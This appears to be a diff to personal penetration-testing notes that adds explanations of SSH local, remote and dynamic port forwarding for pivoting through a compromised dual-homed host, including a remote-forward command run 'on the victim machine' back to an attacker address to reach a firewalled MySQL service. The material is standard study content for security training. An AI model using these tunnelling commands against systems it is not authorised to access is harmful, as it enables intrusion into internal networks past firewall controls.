@@ -28,6 +28,8 @@ blocked machine.
 
 SSH Forwarding
 Encrypted, Bi-Directional, Simple As
+
+LOCAL FORWARDING
 Use SSH to tunnel a local port to a remote server.
 This is useful for pivoting between subnets, like 
 when you compromise a client with 2 network interfaces
@@ -45,13 +47,41 @@ the double interface machine. SSH is enabled on the dual machine,
 so we can port forward through it and enumerate the 192.168.1.x subnet.
 To do this, we run the following command on our attacking machine:
 
-sudo ssh -N -L 0.0.0.0:<PORT>:192.168.1.x:<PORT> user@10.11.0.x
+sudo ssh -N -L 0.0.0.0:<aPORT>:192.168.1.x:<bPORT> user@10.11.0.x
 
-Here, any incoming connection on the attacker at 445 will be forwarded
-to 445 on the 192.168.1.x address through the middle connection at
+Here, any incoming connection on the attacker at aPORT will be forwarded
+to bPORT on the 192.168.1.x address through the middle connection at
 10.11.0.x
 
 If we chose to forward 445, for example, we could then query 
 smbclient pointed at localhost and it would actually send 
 queries to the machine at 192.168.1.x:445 This would allow
 us to enumerate samba two subnets away like it were on our own machine. 
+
+REMOTE FORWARDING
+Remote forwarding is the reverse of local forwarding, where the ports
+are selected on the remote machine and then sent back to the local one.
+
+Imagine you have user access to a Linux client on an internal network.
+There is a MySQL server on 3306, but the firewall is blocking inbound
+22. If outbound 22 is allowed, you can still do a remote forward. 
+On the victim machine, run the following command:
+ssh -N -R <attackerIP>:<atkPORT>:127.0.0.1:<remPORT> attacker@attackaddress
+
+The attacker can then attack a localhost port and receive information
+from the remote host as if it were their own local service.
+
+DYNAMIC FORWARDING
+This is when the local listner tunnels traffic to any remote destination
+using a proxy. using ssh -D will create a local dynamic SOCKS4 layer 7
+proxy tunneled with ssh. 
+
+ssh -N -D <bindaddress>:PORT user@server
+Example: ssh -N -D 127.0.0.1:8080 student@remote.IP
+
+To make use of this proxy we have to edit our /etc/proxychains.conf
+and add:
+socks4 127.0.0.1 8080
+
+now to run commands, you append proxychains to the front of the 
+command and you can run it through the tunnel.
